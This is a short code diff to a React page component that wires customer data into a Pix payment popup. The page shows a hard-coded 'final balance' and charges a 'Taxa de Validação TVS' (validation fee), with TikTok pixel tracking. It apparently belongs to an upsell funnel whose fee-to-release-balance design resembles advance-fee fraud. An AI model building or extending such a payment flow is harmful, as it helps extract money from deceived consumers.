@@ -3,6 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import ParadisePixPopup from '@/components/ParadisePixPopup';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
+import { useCustomerData } from '@/hooks/useCustomerData';
 import '../styles/app.css';
 
 const SALDO_FINAL = 2834.72;
@@ -20,6 +21,7 @@ const formatBR = (value: number) => {
 const Up3 = () => {
   const navigate = useNavigate();
   const [showPixPopup, setShowPixPopup] = useState(false);
+  const { customer } = useCustomerData();
 
   useEffect(() => {
     trackViewContent('Taxa de Validação TVS', TAXA_TVS);
@@ -96,6 +98,7 @@ const Up3 = () => {
             amount={TAXA_TVS_CENTAVOS}
             description="Taxa de Validação TVS"
             productHash={PRODUCT_HASH}
+            customer={customer}
             onSuccess={handlePaymentSuccess}
             onClose={() => setShowPixPopup(false)}
           />
